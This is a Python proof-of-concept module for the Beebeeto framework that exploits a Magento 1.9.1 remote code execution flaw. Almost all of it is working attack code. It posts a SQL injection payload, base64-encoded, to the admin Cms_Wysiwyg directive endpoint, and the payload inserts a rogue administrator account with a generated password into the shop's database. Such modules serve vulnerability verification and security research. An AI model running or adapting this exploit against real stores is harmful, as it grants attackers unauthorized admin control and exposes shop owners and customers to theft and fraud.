#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import base64
import requests

from baseframe import BaseFrame
from utils.generator import generate_user_pwd


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0099',
            'name': 'Magento 1.9.1 远程代码执行漏洞 Exploit',
            'author': 'foundu',
            'create_date': '2015-05-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Magento',
            'vul_version': ['1.9.1'],
            'type': 'Code Execution',
            'tag': ['Magento 1.9.1 漏洞', 'Magento RCE 漏洞', '电子商务系统漏洞', 'php'],
            'desc': '''
                    Magento平台中的一系列严重漏洞最终允许未经授权的攻击者执行他们所选择的
                    web服务器上的任意代码。
                    ''',
            'references': [
                'http://devdocs.magento.com/guides/m1x/other/appsec-900_addhandler.html',
                'http://www.siph0n.in/exploits.php?id=3829',
                ],
        },
    }


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        if url.endswith("/"):
           url = url[:-1]
        target_url = url + "/index.php/admin/Cms_Wysiwyg/directive/index/"
        if args['options']['verbose']:
            print '[*] Request URL: ' + target_url
        # For demo purposes, I use the same attack as is being used in the wild
        SQLQUERY="""
        SET @SALT = 'rp';
        SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
        SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
        INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
        INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
        """
        # Put the nice readable queries into one line,
        # and insert the username:password combinination
        password = generate_user_pwd.password()
        query = SQLQUERY.replace("\n", "").format(username="beebeeto", password=password)
        pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
        r = requests.post(target_url, data={"___directive":
                         "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                         "filter": base64.b64encode(pfilter),
                         "forwarded": 1})
        if r.ok:
            args['success'] = True
            args['poc_ret']['vul_url'] = target_url
            args['poc_ret']['message'] = 'Admin(user/pwd): beebeeto/{})'.format(password)
        return args

    verify = exploit

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())